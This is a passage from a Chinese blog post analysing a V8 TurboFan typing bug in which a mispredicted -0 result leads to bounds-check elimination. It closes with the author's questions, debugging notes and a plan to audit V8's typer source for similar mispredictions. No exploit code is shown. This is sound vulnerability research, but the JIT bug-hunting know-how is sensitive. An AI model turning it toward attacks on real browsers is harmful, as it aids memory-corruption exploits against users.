+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>发现<code>TurboFan</code>最大的一个特点也是最重要的一个特点就是它的“惰性思维”，也就是说不断输入某个特定情况时，那么<code>TurboFan</code>会以为以后的情况也是该种情况，从而优化代码也是按照该种情况来生成，这样就会产生许多问题，比如说这种情况：优化过程中预测所出现的情况并没有把所有可能的情况都包含进去（或者说过于限制，把原本大范围的限制的更小了），导致一些没有包含进去的情况在预测情况生成的优化代码中运行，出现不可知的错误。那么我们就可以在<code>TurboFan</code>中有目的的寻找这种错误，从部分开始下手审计。</p>
+<h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>这里其实有几个问题我是不太明白的。</p>
+<p>首先是本身已经是<code>Call</code>结点了，但是后面调用一次<code>test(-0)</code>的时候结果为<code>True</code>，也就是说<code>Call</code>结点产生了<code>-0</code>，但是<code>Call</code>结点是<code>PlainNumber|NaN</code>并没有<code>-0</code>啊，是怎么产生的？</p>
+<p>答：<code>Call</code>结点处的<code>PlainNumber|NaN</code>类型只是<code>TurboFan</code>的“预测”，并不是说就是只含有这两种类型，他只是“预测”而已，相当于它只是觉得<code>Call</code>结点只能产生<code>PlainNumber|NaN</code>而已，并不是说实际上就是只能产生这样的<code>type</code>，相当于是实际的子集，也就是<strong>“错误的预测”</strong>，用错误的预测生成了错误的优化代码。</p>
+<p>其次是<code>CheckBounds</code>是如何消除的？图中已经表明了<code>CheckBounds</code>左分支为<code>Range(0,4)</code>，那么<code>4</code>不应该是已经超出<code>Array MaxLength</code>了吗，为什么还能被消除呢？</p>
+<p>这里不理解。</p>
+<p>后面上手调，才发现几个很坑的点，一开始是下不了断点的，只有在程序在<code>gdb</code>里面跑起来的时候才能用文件地址加行数下断点，这里巨坑。后面在<code>checkbounds</code>下断点，共断下来四次左右，前两次是满足不了条件无法消除<code>CheckBounds</code>的，且没满足<code>lowering</code>这个条件就退出了，但是后面进了，且也是成功执行了<code>DeferReplacement</code>。但是我这里没法看<code>Range()</code>，我也不知道为啥，头痛。调不来。所以暂且就猜测他是在最后的时候反馈了<code>Range(0,0)</code>结点才消除<code>CheckBounds</code>的吧。</p>
+<p>最后是<code>SameValue</code>处右结点已经折叠为<code>-0</code>了，那么之后反馈过程中一直为<code>false</code>，为什么不折叠为<code>index为0</code>呢直接取第一个元素呢，还是要用<code>index offset</code>去取<code>element</code>呢？</p>
+<p>这个我也不理解。</p>
+<p>我猜测是<code>TurboFan</code>开始在<code>simplified-lowering</code>阶段中得到的反馈是<code>Range(0,4)</code>的类型导致无法消除<code>CheckBounds</code>，自然也不可能直接折叠为<code>false</code>，而在后面阶段的继续执行的时候，得到了一直为<code>false</code>的反馈，导致消除了<code>CheckBounds</code>，但是又因为之前得到过<code>true</code>的情况，导致了编译器“惰性”的认为有不同的情况，所以采用了取<code>element</code>的形式而不是直接折叠。</p>
+<p><code>v8</code>代码好多也太难调了，给个活路吧..到时候都要变成预言家了..开局一电脑，全局全靠猜。</p>
+<h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>这个洞给我提供了一个思路。</p>
+<p>就是说既然<code>v8</code>全靠猜和自我认知，那么就往它猜错的方向找，自然而然不就可以找到漏洞吗？</p>
+<p>也就是说，我只要找到他没有猜到的地方，就可以找到洞。</p>
+<p>相似的，我们可从上面得到的<code>typer.cc</code>以及<code>operation-typer.cc</code>两个文件下手，去找一找有没有相类似的所遗漏“猜”的地方，利用遗漏的“猜”找到突破点。</p>
+<h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><ol>
+<li><a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/" target="_blank" rel="noopener">https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/</a></li>
+</ol>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/08/05/v8-JIT-Element Kind Confusion/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2019/08/30/一段匆匆忙忙的旅程/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
